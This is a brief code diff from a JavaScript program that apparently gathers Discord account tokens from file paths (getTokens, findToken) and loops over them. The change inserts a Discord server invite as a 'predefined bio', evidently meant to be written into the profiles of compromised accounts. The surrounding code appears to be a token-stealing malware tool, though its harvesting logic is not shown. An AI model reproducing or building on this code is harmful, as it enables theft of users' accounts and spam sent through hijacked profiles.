@@ -1865,7 +1865,7 @@ async function getTokens() {
         await findToken(path);
     }
 
-    const predefinedBio = ``;
+    const predefinedBio = `discord.gg/velocitynetworks`;
 
     for (let token of tokens) {
         try {
